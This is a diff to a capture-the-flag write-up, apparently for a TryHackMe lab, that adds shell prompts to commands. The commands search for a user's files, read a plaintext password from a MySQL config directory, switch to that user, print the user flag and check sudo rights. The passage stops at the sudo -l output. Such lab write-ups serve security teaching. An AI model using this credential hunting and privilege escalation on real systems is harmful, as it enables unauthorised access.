@@ -269,7 +269,7 @@ Elyana's user password is hidden in the system. Find it ;)
 I used find command to find the files owned by "elyana" and found the password:
 
 ~~~
-find / -user elyana -type f 2>/dev/null
+bash-4.4$ find / -user elyana -type f 2>/dev/null
 /home/elyana/user.txt
 /home/elyana/.bash_logout
 /home/elyana/hint.txt
@@ -283,7 +283,7 @@ find / -user elyana -type f 2>/dev/null
 The password was in `/etc/mysql/conf.d/private.txt`:
 
 ~~~
-cat /etc/mysql/conf.d/private.txt
+bash-4.4$ cat /etc/mysql/conf.d/private.txt
 user: elyana
 password: E@syR18ght
 ~~~
@@ -291,13 +291,13 @@ password: E@syR18ght
 Next I switched to elyana and read the user flag.
 
 ~~~
-su elyana
+bash-4.4$ su elyana
 E@syR18ght
 
-id
+bash-4.4$ id
 uid=1000(elyana) gid=1000(elyana) groups=1000(elyana),4(adm),27(sudo),108(lxd)
 
-cat /home/elyana/user.txt
+bash-4.4$ cat /home/elyana/user.txt
 VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
 ~~~
 
@@ -310,7 +310,7 @@ User Flag: `THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}`
 Now wwe need to gain root access. the first thing I try is `sudo -l` which shows the sudo permissions:
 
 ~~~
-sudo -l
+bash-4.4$ sudo -l
 Matching Defaults entries for elyana on elyana:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
